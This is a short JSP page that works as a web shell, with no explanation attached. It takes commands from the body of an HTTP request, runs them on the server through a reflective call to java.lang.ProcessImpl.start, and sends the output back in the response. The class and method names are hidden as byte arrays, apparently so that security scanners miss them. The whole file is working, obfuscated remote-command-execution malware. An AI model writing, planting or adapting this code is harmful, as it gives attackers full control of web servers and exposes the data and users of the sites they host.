<%@ page import="java.io.*" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Map" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    BufferedReader br = request.getReader();
    String str, wholeStr = "";
    while((str = br.readLine()) != null) {
        wholeStr += str + "\n";
    }
	br.close();
	
    if(wholeStr != null && !wholeStr.trim().equals("")){
		wholeStr = wholeStr.substring(0,wholeStr.length()-1);
        Class clazz = Class.forName(new String(new byte[] {106,97,118,97,46,108,97,110,103,46,80,114,111,99,101,115,115,73,109,112,108}));
        Method method = clazz.getDeclaredMethod(new String(new byte[]{115,116,97,114,116}), String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
        method.setAccessible(true);
        Process p = (Process)method.invoke(null, wholeStr.split(",",3), null, null, null, true);
        InputStream in = p.getInputStream();
        int len = 0;
        byte[] buffer = new byte[1024];
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        while((len = in.read(buffer)) != -1){
            baos.write(buffer, 0, len);
        }
		
        response.getWriter().print(baos.toString().trim());
		in.close();
		baos.close();
    }
%>